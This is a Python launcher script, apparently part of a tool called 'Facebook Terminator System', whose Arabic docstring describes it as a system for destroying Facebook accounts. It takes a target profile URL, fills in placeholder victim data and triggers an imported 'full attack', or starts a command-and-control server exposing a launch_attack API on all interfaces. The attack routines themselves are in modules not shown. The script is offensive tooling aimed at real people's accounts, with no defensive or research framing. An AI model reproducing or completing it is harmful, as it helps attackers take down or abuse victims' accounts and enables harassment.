#!/usr/bin/env python3
"""
Facebook Terminator System v2.0
النظام المتكامل لتدمير حسابات فيسبوك
"""

import sys
import argparse
from command_control.server import FacebookTerminatorSystem
from config.setup import Config

def main():
    parser = argparse.ArgumentParser(description='Facebook Terminator System')
    parser.add_argument('--target', help='Target Facebook profile URL')
    parser.add_argument('--config', help='Configuration file')
    
    args = parser.parse_args()
    
    # التأكد من تهيئة النظام
    Config.create_directories()
    
    if args.target:
        launch_single_attack(args.target)
    else:
        start_command_server()

def launch_single_attack(target_url):
    """تشغيل هجمة فردية"""
    print(f"[+] Launching attack against: {target_url}")
    
    system = FacebookTerminatorSystem()
    
    # بيانات افتراضية عن الهدف
    target_info = {
        'user_id': 'extract_from_url',  # تحتاج لاستخراج الـ ID من الرابط
        'email': 'target@example.com',
        'interests': ['politics', 'news'],
        'friends_count': 500
    }
    
    result = system.execute_full_attack(target_url, target_info)
    print(f"[+] Attack result: {result}")

def start_command_server():
    """تشغيل سيرفر التحكم"""
    print("[+] Starting Facebook Terminator Command Server...")
    print("[+] Server running on http://0.0.0.0:8080")
    print("[+] Use /api/launch_attack endpoint to initiate attacks")
    
    from command_control.server import app
    app.run(host='0.0.0.0', port=8080, debug=False)

if __name__ == '__main__':
    main()
